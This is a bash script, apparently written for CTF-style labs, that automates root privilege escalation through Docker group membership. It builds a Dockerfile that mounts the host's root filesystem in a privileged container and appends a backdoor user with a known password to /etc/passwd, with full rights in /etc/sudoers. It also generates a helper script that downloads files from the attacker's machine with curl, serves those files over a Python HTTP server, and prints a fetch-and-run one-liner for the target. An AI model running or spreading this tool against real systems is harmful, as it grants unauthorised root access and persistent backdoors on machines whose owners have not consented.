#!/bin/bash

LPORT=8000 # Change this
NEWUSER="hacker" # Change this
NEWPASS="hacker" # Change this

LHOST=$(ifconfig | grep "inet " | cut -d " " -f 10 | grep "10") # Here I grepped 10 for tun0 ip address (vpn connection, like tryhackme or hackthebox...), change it if trying to pwn a LOCAL MACHINE...
LPASS=$(openssl passwd $NEWPASS)

bash ./alpine-builder.sh || exit
echo

cat <<EOF > Dockerfile
FROM scratch
ADD alpine.tar.gz /
RUN echo "echo '$NEWUSER:$LPASS:9999:9999:::/bin/bash' >> /mnt/etc/passwd" > /tmp/newAccount.sh
RUN echo "echo '$NEWUSER ALL=(ALL) ALL' >> /mnt/etc/sudoers; exit" >> /tmp/newAccount.sh
CMD ["/tmp/newAccount.sh"]
EOF

cat <<EOF > docker_exploit.sh
#!/bin/bash

curl -O http://$LHOST:$LPORT/Dockerfile
curl -O http://$LHOST:$LPORT/alpine.tar.gz

docker build . -t alpine:v0.1
docker run -v /:/mnt/ --privileged -it alpine:v0.1 /bin/sh /tmp/newAccount.sh
echo
echo
echo "Sorry, BUT THE PASSWORD IS: $NEWPASS"
su $NEWUSER
EOF

echo "Run in the remote machine: 'cd \$(mktemp -d); curl -O http://$LHOST:$LPORT/docker_exploit.sh; bash docker_exploit.sh'"
echo

python3 -m http.server $LPORT
